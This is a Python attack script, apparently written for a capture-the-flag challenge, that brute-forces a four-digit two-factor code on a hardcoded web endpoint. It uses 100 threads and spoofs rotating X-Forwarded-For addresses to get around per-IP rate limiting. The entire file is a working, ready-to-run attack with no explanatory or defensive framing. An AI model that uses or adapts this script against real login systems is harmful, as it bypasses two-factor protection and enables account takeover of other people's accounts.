import requests
import sys
from concurrent.futures import ThreadPoolExecutor

def get_combinations_in_array(path):
    with open(path, 'r') as f:
        return f.read().splitlines()
    
def handle_response(response, combination):
    if "Invalid 2FA Code!" in response.text:
        print(f'Try: {combination}')
        return
    elif "flag" in response.text:
        print(f'GOT IT\n2FA Code: {combination}')
        sys.exit()
    else:
        print(response.text)
        
def send_request(ip, combination, headers, url):
    headers['X-Forwarded-For'] = ip
    data = {'2fa-code': str(combination)}
    
    response = requests.post(url, headers=headers, data=data)
    handle_response(response, combination)
    
def send_all_requests(url, combinations_array):
    base_ip = '192.168.'
    current_ip_suffix = [1, 1]
    headers = {
        'Host': '83.136.251.168:43907',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Referer': '83.136.251.168:43907/auth/verify-2fa',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '13',
        'Origin': '83.136.251.168:43907',
        'DNT': '1',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
    }

    # Multi-threading requests sending (see python ThreadPoolExecutor lib for more informations)
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = []

        for i, combination in enumerate(combinations_array, start=1):
            ip = base_ip + str(current_ip_suffix[0]) + '.' + str(current_ip_suffix[1])

            future = executor.submit(send_request, ip, combination, headers, url)
            futures.append(future)

            if i % 5 == 0:
                current_ip_suffix[1] += 1

            if current_ip_suffix[1] > 254:
                current_ip_suffix[1] = 1
                current_ip_suffix[0] += 1

            if current_ip_suffix[0] > 254:
                current_ip_suffix = [1, 1]

            for future in futures:
                future.result()


if __name__ == '__main__':
    combinations_path = '/usr/share/seclists/Fuzzing/4-digits-0000-9999.txt'
    url ='http://83.136.251.168:43907/auth/verify-2fa'

    combinations_array = get_combinations_in_array(combinations_path)
    send_all_requests(url, combinations_array)